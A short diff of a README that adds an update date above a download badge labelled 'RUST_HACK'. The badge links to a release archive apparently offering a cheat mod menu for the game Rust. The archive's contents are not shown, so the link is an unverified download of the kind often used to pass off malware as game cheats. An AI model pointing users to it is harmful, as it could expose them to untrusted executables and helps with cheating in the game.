@@ -1,3 +1,5 @@
+# Updated 06.12.2024
+
 # Download
 [<img src="https://img.shields.io/badge/RUST_HACK-DOWNLOAD-blue?style=for-the-badge">](https://github.com/irwin1z/Rust-Phoenix/releases/download/mqz/Rust_ModMenu_Installing.zip)
 
